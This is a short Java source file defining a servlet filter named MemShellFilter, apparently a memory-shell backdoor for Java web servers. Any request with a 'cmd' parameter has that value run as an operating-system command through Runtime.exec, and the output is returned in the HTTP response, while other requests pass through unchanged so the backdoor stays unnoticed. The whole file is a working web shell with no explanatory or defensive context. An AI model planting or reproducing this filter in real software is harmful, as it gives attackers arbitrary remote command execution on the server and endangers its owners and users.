package com.server.Filter;


import jakarta.servlet.*;

import java.io.IOException;

public class MemShellFilter implements Filter{
    @Override
    public void init(FilterConfig filterConfig) {}

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
        } else {
            chain.doFilter(request, response);
        }
    }

    @Override
    public void destroy() {}
}

